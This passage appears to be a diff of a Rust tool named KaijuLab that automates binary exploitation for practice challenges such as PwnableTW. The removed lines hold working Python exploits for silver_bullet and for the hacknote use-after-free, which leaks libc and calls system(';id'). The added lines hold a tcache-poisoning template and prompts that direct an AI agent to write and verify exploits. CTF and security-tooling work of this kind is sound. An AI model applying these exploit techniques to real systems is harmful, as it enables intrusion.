-            buf += c
-            if marker in buf: return buf
-    return buf
-def sl(p, s):
-    if isinstance(s, str): s = s.encode()
-    p.stdin.write(s + b"\n"); p.stdin.flush()
-def create(p, data):
-    rx(p, b"choice"); sl(p, "1"); rx(p, b"bullet :"); sl(p, data)
-def power(p, data):
-    rx(p, b"choice"); sl(p, "2"); rx(p, b"bullet :"); sl(p, data)
-def beat(p):
-    rx(p, b"choice"); sl(p, "3")
-def main():
-    argv = [RUNNER, "-L", SYSROOT, BIN] if SYSROOT else [RUNNER, BIN]
-    p = subprocess.Popen(argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    try:
-        create(p, b"A" * 47)
-        power(p, b"B")
-        power(p, b"\xff" * 7 + p32(0x80484b8) + p32(0x41414141) + p32(42))
-        beat(p)
-        try: out, err = p.communicate(timeout=4)
-        except subprocess.TimeoutExpired:
-            p.kill(); out, err = p.communicate()
-        sys.stdout.buffer.write(out[-512:]); sys.stderr.buffer.write(err[-512:])
-        print("returncode=%s" % p.returncode)
-        return 0 if p.returncode == 42 else 1
-    finally:
-        try: p.kill()
-        except Exception: pass
-if __name__ == "__main__":
-    raise SystemExit(main())
-"#
-    )
-}
-
-fn hacknote_uaf_script(binary: &Path, sysroot: &str) -> String {
-    let bin = py_string(&binary.to_string_lossy());
-    let sysroot = py_string(sysroot);
-    format!(
-        r#"#!/usr/bin/env python3
-import os, re, select, struct, subprocess, sys, time
-BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {bin}
-SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot}
-RUNNER = os.environ.get("QEMU_I386") or "/usr/bin/qemu-i386-static"
-def p32(x): return struct.pack("<I", x & 0xffffffff)
-def u32(b): return struct.unpack("<I", b[:4].ljust(4, b"\x00"))[0]
-def rx(p, marker, timeout=2.0):
-    buf = b""; end = time.time() + timeout
-    while time.time() < end:
-        r,_,_ = select.select([p.stdout], [], [], 0.05)
-        if r:
-            c = os.read(p.stdout.fileno(), 4096)
-            if not c: break
-            buf += c
-            if marker in buf: return buf
-    return buf
-def sl(p, s):
-    if isinstance(s, str): s = s.encode()
-    p.stdin.write(s + b"\n"); p.stdin.flush()
-def add(p, size, data):
-    rx(p, b"choice"); sl(p, "1"); rx(p, b"size"); sl(p, str(size)); rx(p, b"Content"); sl(p, data)
-def delete(p, idx):
-    rx(p, b"choice"); sl(p, "2"); rx(p, b"Index"); sl(p, str(idx))
-def show(p, idx):
-    rx(p, b"choice"); sl(p, "3"); rx(p, b"Index"); sl(p, str(idx)); return rx(p, b"choice", 1.0)
-def libc_offsets():
-    libc = os.path.join(SYSROOT, "usr/lib/i386-linux-gnu/libc.so.6")
-    out = subprocess.check_output(["readelf", "-s", libc], stderr=subprocess.DEVNULL, timeout=4).decode("latin1", "ignore")
-    vals = {{}}
-    for line in out.splitlines():
-        cols = line.split()
-        if len(cols) >= 8 and cols[1].isalnum():
-            name = cols[-1].split("@@", 1)[0]
-            if name in ("puts", "system"):
-                vals[name] = int(cols[1], 16)
-    return vals["puts"], vals["system"]
-def main():
-    puts_off, system_off = libc_offsets()
-    p = subprocess.Popen([RUNNER, "-L", SYSROOT, BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    try:
-        add(p, 32, b"A" * 8); add(p, 32, b"B" * 8); delete(p, 0); delete(p, 1)
-        add(p, 8, p32(0x804862b) + p32(0x804a024))
-        out = show(p, 0)
-        leak = None
-        for i in range(max(0, len(out) - 3)):
-            v = u32(out[i:i+4])
-            if 0x30000000 <= v <= 0xf8000000:
-                leak = v; break
-        if leak is None:
-            sys.stdout.buffer.write(out[-512:]); print("returncode=99 (no libc leak)"); return 1
-        system = leak - puts_off + system_off
-        delete(p, 2)
-        add(p, 8, p32(system) + b";id")
-        show(p, 0)
-        try: out, err = p.communicate(timeout=1)
-        except subprocess.TimeoutExpired:
-            p.kill(); out, err = p.communicate()
-        sys.stdout.buffer.write(out[-512:]); sys.stderr.buffer.write(err[-512:])
-        print("returncode=%s" % p.returncode)
-        return 0 if p.returncode == 42 else 1
-    finally:
-        try: p.kill()
-        except Exception: pass
-if __name__ == "__main__":
-    raise SystemExit(main())
-"#
-    )
-}
-
 fn poc_template_script(binary: &Path, sysroot: &str, family: &str) -> String {
     let bin = py_string(&binary.to_string_lossy());
     let sysroot = py_string(sysroot);
@@ -6455,7 +6747,7 @@ BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {bi
 SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot}
 FAMILY = {family}
 print("AUTO_PWN_SCAFFOLD=%s" % FAMILY)
-print("returncode=99 (no verified offline finalizer matched this target)")
+print("returncode=99 (scaffold only; target-specific logic not supplied)")
 raise SystemExit(1)
 "#
     )
@@ -6475,20 +6767,34 @@ fn batch_files_from_spec(spec: &str) -> Result<Vec<PathBuf>> {
         .collect())
 }
 
-fn default_pwnabletw_batch_files() -> Vec<PathBuf> {
-    [
-        "samples/PwnableTW/tcache-tear/tcache_tear",
-        "samples/PwnableTW/silver-bullet/silver_bullet",
-        "samples/PwnableTW/realloc/re-alloc",
-        "samples/PwnableTW/seethefile/seethefile",
-        "samples/PwnableTW/dubblesort/dubblesort",
-        "samples/PwnableTW/hacknote/hacknote",
-        "samples/PwnableTW/applestore/applestore",
-    ]
-    .iter()
-    .map(PathBuf::from)
-    .filter(|p| p.exists())
-    .collect()
+fn default_local_binary_batch_files() -> Vec<PathBuf> {
+    let mut out = Vec::new();
+    collect_elf_files(Path::new("samples"), &mut out, 4);
+    out.sort();
+    out
+}
+
+fn collect_elf_files(dir: &Path, out: &mut Vec<PathBuf>, depth: usize) {
+    if depth == 0 || !dir.is_dir() {
+        return;
+    }
+    let Ok(entries) = std::fs::read_dir(dir) else {
+        return;
+    };
+    for entry in entries.flatten() {
+        let path = entry.path();
+        if path.is_dir() {
+            collect_elf_files(&path, out, depth - 1);
+            continue;
+        }
+        let Ok(mut file) = std::fs::File::open(&path) else {
+            continue;
+        };
+        let mut magic = [0u8; 4];
+        if file.read_exact(&mut magic).is_ok() && magic == *b"\x7fELF" {
+            out.push(path);
+        }
+    }
 }
 
 fn select_libc_path(binary: &Path, explicit: Option<&Path>) -> Result<PathBuf> {
@@ -6545,11 +6851,35 @@ fn json_u64(value: &serde_json::Value) -> Option<u64> {
 }
 
 fn heap_probe_plan_json(binary: &Path) -> Result<serde_json::Value> {
+    let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
     let facts = binary_facts_json(binary, 30)?;
+    let realloc_menu = detect_realloc_menu_model(binary, &data);
+    let targeted_probes = realloc_menu
+        .as_ref()
+        .map(|model| {
+            serde_json::json!([
+                {
+                    "name": "realloc-zero stale slot",
+                    "goal": "Prove whether realloc(slot, 0) frees storage while the logical index remains reachable.",
+                    "drive_actions": model.get("drive_probe"),
+                    "heap_model_events": model.get("probe_events"),
+                    "success_signal": "A later realloc/edit/free on the same index is accepted after size 0 and reaches the menu without losing synchronization."
+                },
+                {
+                    "name": "same-bin tcache poisoning candidate",
+                    "goal": "Use the stale realloc slot to place a pointer-sized fd candidate, then allocate the same size until the poisoned target is returned.",
+                    "primitive_template": "alloc(0,0x78,A); realloc(0,0); realloc(0,0x78,p64(aligned_target)); alloc(1,0x78,B); realloc(0,0x78,prefix+data)",
+                    "success_signal": "The final write primitive changes target-controlled memory or reaches a hook/GOT/function-pointer call path."
+                }
+            ])
+        })
+        .unwrap_or_else(|| serde_json::json!([]));
     Ok(serde_json::json!({
         "kind": "heap_probe_plan",
         "binary": binary,
         "strategy_families": facts.get("ranked_exploit_families"),
+        "menu_model": realloc_menu,
+        "targeted_probes": targeted_probes,
         "generic_probes": [
             {
                 "name": "menu transcript map",
@@ -6613,26 +6943,18 @@ fn runtime_run_json(
     let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
     let context = build_exploit_context(binary, 8)?;
     let stdin_bytes = read_input_spec(stdin_spec)?;
-    let mut cmdline = Vec::new();
 
     let arch = binary_arch_from_data(&data);
     let interpreter = binary_interpreter_from_data(&data);
-    let effective_sysroot = effective_sysroot(sysroot, arch.as_deref(), interpreter.as_deref());
-    let effective_runner = runner
-        .map(|r| r.to_string())
-        .or_else(|| default_runner_for_arch(arch.as_deref()));
-
-    if let Some(runner) = &effective_runner {
-        cmdline.push(runner.to_string());
-        if let Some(sysroot) = effective_sysroot.as_deref() {
-            cmdline.push("-L".to_string());
-            cmdline.push(sysroot.to_string_lossy().into_owned());
-        }
-        cmdline.push(binary.to_string_lossy().into_owned());
-    } else {
-        cmdline.push(binary.to_string_lossy().into_owned());
-    }
-    cmdline.extend(args.iter().cloned());
+    let target_cmd = target_command_line(
+        binary,
+        arch.as_deref(),
+        interpreter.as_deref(),
+        runner,
+        sysroot,
+        args,
+    );
+    let cmdline = target_cmd.cmdline.clone();
 
     let mut cmd = Command::new(&cmdline[0]);
     cmd.args(&cmdline[1..])
@@ -6663,8 +6985,9 @@ fn runtime_run_json(
         "kind": "runtime_run",
         "binary": binary,
         "cmd": cmdline,
-        "runner_selected": effective_runner,
-        "sysroot_selected": effective_sysroot.as_deref(),
+        "runner_selected": target_cmd.runner,
+        "sysroot_selected": target_cmd.sysroot.as_deref(),
+        "loader_selected": target_cmd.loader.as_deref(),
         "cwd": cwd,
         "timeout_secs": timeout_secs.clamp(1, 300),
         "elf_runtime": runtime_candidates(binary, &data),
@@ -7313,7 +7636,7 @@ Required loop:
 2. Use at most 3 quick KaijuLab probes before writing {output_q}. Do not run raw objdump/readelf/strings before a candidate exists.
 3. Prefer these exact commands:
    - `{cli} api binary-facts --file {binary_q}`
-   - `{cli} api heap-probe-plan --file {binary_q}`
+   - `{cli} api heap-probe-plan --file {binary_q}` and use `targeted_probes` first when present
    - `{cli} api exploit-drive --file {binary_q}{sysroot_arg} --actions '[{{"recv_until":"choice"}},{{"send_line":"1"}},{{"read_for_ms":200}}]' --expect TEXT --timeout-secs 5`
    - `{cli} api heap-model --file {binary_q} --events '[{{"op":"alloc","id":0,"size":32}},{{"op":"free","id":0}},{{"op":"show","id":0}}]'`
    - `{cli} api leak-probe --file {binary_q}{sysroot_arg} --cycle '[{{"recv_until":"choice"}},{{"send_line":"2"}},{{"read_for_ms":200}}]' --want pointer --max-rounds 4`
@@ -7321,7 +7644,7 @@ Required loop:
    - `{cli} api exploit-plan --file {binary_q} --primitive duplicate-allocation --primitive arbitrary-write`
    - `{cli} api poc-synthesize --file {binary_q}{sysroot_arg} --chain arbitrary-write --primitive duplicate-allocation --primitive arbitrary-write --output {output_q}`
    - `{cli} api constraint-plan --file {binary_q} --mode sorted-ascending --value 0xADDR`
-4. `poc-synthesize` output is only plumbing. Before verification, edit {output_q} so it has concrete menu actions and no unresolved TODO placeholders on the executed path.
+4. `poc-synthesize` may include a concrete menu primitive template when `menu_model.kind` is present. Keep its helpers, fill the primitive body/targets, and do not verify an executed path with unresolved TODO placeholders.
 5. After writing the real PoC, run `{cli} api exploit-verify --file {binary_q}{sysroot_arg} --expect-target-exit 42 {output_q}`.
 6. If verification fails, run `{cli} api poc-repair --file {binary_q}{sysroot_arg} {output_q}` and apply exactly one repair.
 7. Print SCRIPT_READY only if exploit-verify returns success=true. Otherwise leave the best candidate at {output_q} and summarize the last structured failure.
@@ -7393,8 +7716,8 @@ Rules:
 - Use this absolute KaijuLab command even after changing directories: `{cli}`.
 - Use `{cli} api binary-facts --file {binary_q}` first when you need a compact, agent-sized summary of protections, imports, strings, libc offsets, gadgets, and ranked exploit families.
 - Use `{cli} api exploit-scaffold --file {binary_q} --output {output_q}{sysroot_arg}` before writing a PoC from scratch; then edit the generated candidate instead of rebuilding process/qemu plumbing.
-- For heap/menu targets, use `{cli} api heap-probe-plan --file {binary_q}` before guessing primitives, then run synchronized probes with `{cli} api exploit-drive --file {binary_q}{sysroot_arg} --actions '[{{"recv_until":"choice"}},{{"send_line":"4"}},{{"read_for_ms":200}}]' --expect TEXT --timeout-secs 5`.
-- After a heap transcript exists, normalize it into events and run `{cli} api heap-model --file {binary_q} --events '[{{"op":"alloc","id":0,"size":32}},{{"op":"free","id":0}},{{"op":"show","id":0}}]'` before choosing UAF/double-free/overlap hypotheses.
+- For heap/menu targets, use `{cli} api heap-probe-plan --file {binary_q}` before guessing primitives. If it returns `targeted_probes`, run those exact `drive_actions` with `{cli} api exploit-drive --file {binary_q}{sysroot_arg} --actions @actions.json --expect TEXT --timeout-secs 5` before falling back to generic menu guesses.
+- After a heap transcript exists, normalize it into events and run `{cli} api heap-model --file {binary_q} --events '[{{"op":"alloc","id":0,"size":32}},{{"op":"free","id":0}},{{"op":"show","id":0}}]'` before choosing UAF/double-free/overlap hypotheses. For realloc menus, preserve the helper shape from `poc-synthesize` and iterate only the `primitive_write` body.
 - For leaks, prefer `{cli} api leak-probe --file {binary_q}{sysroot_arg} --setup @setup.json --cycle @cycle.json --want libc --max-rounds 8` over manual transcript scraping; use it for `/proc/self/maps`, repeated show/read cycles, and raw pointer candidate harvesting.
 - After any libc leak, run `{cli} api libc-resolve --file {binary_q} --leak 0xADDR --symbol SYMBOL` before hardcoding offsets. After proving primitives, run `{cli} api exploit-plan --file {binary_q} --primitive libc-leak --primitive arbitrary-write` to rank finalization paths.
 - Use `{cli} api exploit-context --file {binary_q}` whenever you need refreshed target/runtime/gadget facts.
